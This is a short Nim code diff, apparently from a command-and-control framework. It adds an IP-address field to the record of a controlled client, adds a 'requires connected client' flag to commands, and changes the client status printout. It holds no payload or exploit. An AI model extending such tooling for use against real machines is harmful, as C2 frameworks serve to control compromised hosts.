@@ -56,6 +56,7 @@ type
     isAdmin*: bool
     hostname*: string
     username*: string
+    ipAddress*: string
     osType*: OSType
     server*: C2Server
     windowsVersionInfo*: WindowsVersionInfo
@@ -91,6 +92,7 @@ type
     cliMode*: seq[CliMode]
     category*: CommandCategory
     description*: string
+    requiresConnectedClient*: bool
 
 
 proc getTcpSocket*(client: C2Client): TCPSocket =
@@ -135,7 +137,8 @@ proc `@`*(client: C2Client): string =
   if not client.loaded:
     $client & "(" & (if client.connected: "alive" else: "dead") & ")"
   else:
-    $client & " (" & (if client.connected: "alive" else: "dead") & ") INITIALIZED\n\t" & 
+    $client & " (" & (if client.connected: "alive" else: "dead") & ")\n\t" & 
+      "IP: " & client.ipAddress & "\n\t" &
       "Username: " & client.username & "\n\t" &
       "Is Admin: " & $client.isAdmin & "\n\t" &
       "OS: " & $client.osType & (
